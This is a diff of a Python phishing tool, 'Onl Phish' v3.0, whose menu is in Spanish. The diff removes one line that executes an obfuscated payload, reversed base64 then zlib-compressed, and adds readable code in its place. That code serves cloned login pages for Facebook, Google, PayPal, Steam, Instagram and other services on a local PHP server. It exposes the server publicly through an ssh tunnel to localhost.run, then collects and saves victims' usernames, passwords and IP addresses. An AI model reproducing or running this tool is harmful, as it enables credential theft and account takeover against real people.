@@ -1,1 +1,185 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import time
+from colorama import Fore
+from re import search
+from os.path import isfile
+from subprocess import DEVNULL, PIPE, Popen, STDOUT
+
+global site
+
+def cat(file):
+    if isfile(file):
+        with open(file, "r") as filedata:
+            return filedata.read()
+    return ""
+
+error_file = "logs/error.log"
+
+def append(text, filename):
+    with open(filename, "a") as file:
+        file.write(str(text)+"\n")
+
+def grep(regex, target):
+    if isfile(target):
+        content = cat(target)
+    else:
+        content = target
+    results = search(regex, content)
+    if results is not None:
+        return results.group(1)
+    return ""
+
+def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
+    try:
+        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
+    except Exception as e:
+        append(e, error_file)
+
+cf_file = "logs/lh.log"
+cf_log = open(cf_file, 'w')
+
+def setup(site):
+    print('\n[~] Iniciando servidor php...')
+    print('[~] Puerto: 8080')
+    os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
+    time.sleep(2)
+    print('\n[~] Servidor php: ✔️')
+    print('\n[~] Creando links...')
+    time.sleep(2)
+    bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=cf_log, stderr=cf_log)
+    cf_success = False
+    for i in range(10):
+        cf_url = grep("(https://[-0-9a-z.]*.lhr.life)", cf_file)
+        if cf_url != "":
+            cf_success = True
+            break
+        time.sleep(1)
+    print(f'\n[~] Link: {cf_url}')
+    print('\n[~] Esperando datos...')
+    while True:
+        if os.path.isfile(f'pages/{site}/usuarios.txt'):
+            print('\n\033[31m[!] Usuarios encontrados!')
+            print('\033[92m')
+            os.system(f"cat pages/{site}/usuarios.txt")
+            os.system(f"cat pages/{site}/usuarios.txt >> pages/{site}/usuarios_guardados.txt")
+            os.system(f"rm -rf pages/{site}/usuarios.txt")
+            print('\n\033[34m[~] Usuarios guardados en: usuarios_guardados.txt')
+        if os.path.isfile(f'pages/{site}/ip.txt'):
+            print('\n\033[31m[!] IP encontrados!')
+            print('\033[31m')
+            os.system(f"cat pages/{site}/ip.txt")
+            os.system(f"cat pages/{site}/ip.txt >> pages/{site}/ip_guardados.txt")
+            os.system(f"rm -rf pages/{site}/ip.txt")
+            print('')
+            print('\n\033[34m[~] IP guardados en: ip_guardados.txt')
+
+def menu():
+    os.system("killall php")
+    os.system("clear")
+    print("""\033[92m
+ ██████  ███    ██ ██     ██████  ██   ██ ██ ███████ ██   ██ 
+██  ████ ████   ██ ██     ██   ██ ██   ██ ██ ██      ██   ██ 
+██ ██ ██ ██ ██  ██ ██     ██████  ███████ ██ ███████ ███████ 
+████  ██ ██  ██ ██ ██     ██      ██   ██ ██      ██ ██   ██ 
+ ██████  ██   ████ ██     ██      ██   ██ ██ ███████ ██   ██
+                  v3.0
+           |---[  By: Euronymou5 ]---|       
+    """)
+    print("""
+    [1] Facebook   [2] Google gmail
+
+    [3] Twitter    [4] Netflix
+
+    [5] Github     [6] Discord
+
+    [7] Paypal     [8] Roblox
+
+    [9] Steam      [10] Instagram
+    """)
+    inl = int(input('\n>> '))
+    if inl == 1:
+        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "Facebook"
+          setup(site)
+        elif a == 2:
+            site = "Facebook_en"
+            setup(site)
+        else:
+            menu()
+    elif inl == 2:
+        site = "Google"
+        setup(site)
+    elif inl == 3:
+        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "Twitter"
+          setup(site)
+        elif a == 2:
+            site = "Twitter_en"
+            setup(site)
+        else:
+            menu()
+    elif inl == 4:
+        site = "Netflix"
+        setup(site)
+    elif inl == 5:
+        site = "Github"
+        setup(site) 
+    elif inl == 6:
+        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "discord"
+          setup(site)
+        elif a == 2:
+            site = "discord_en"
+            setup(site)
+        else:
+            menu()
+    elif inl == 7:
+        site = "paypal"
+        setup(site)
+    elif inl == 8:
+        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "roblox_es"
+          setup(site)
+        elif a == 2:
+            site = "roblox_en"
+            setup(site)
+        else:
+            menu()
+    elif inl == 9:
+        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[1] Español')
+        print('\n[2] Ingles')
+        a = int(input('\n>> '))
+        if a == 1:
+          site = "Steam"
+          setup(site)
+        elif a == 2:
+            site = "Steam_en"
+            setup(site)
+        else:
+            menu()
+    elif inl == 10:
+        site = "instagram"
+        setup(site)
+    else:
+        print(f'{Fore.RED}\n[!] Error opcion invalida!')
+        time.sleep(2)
+        menu()
+
+menu()
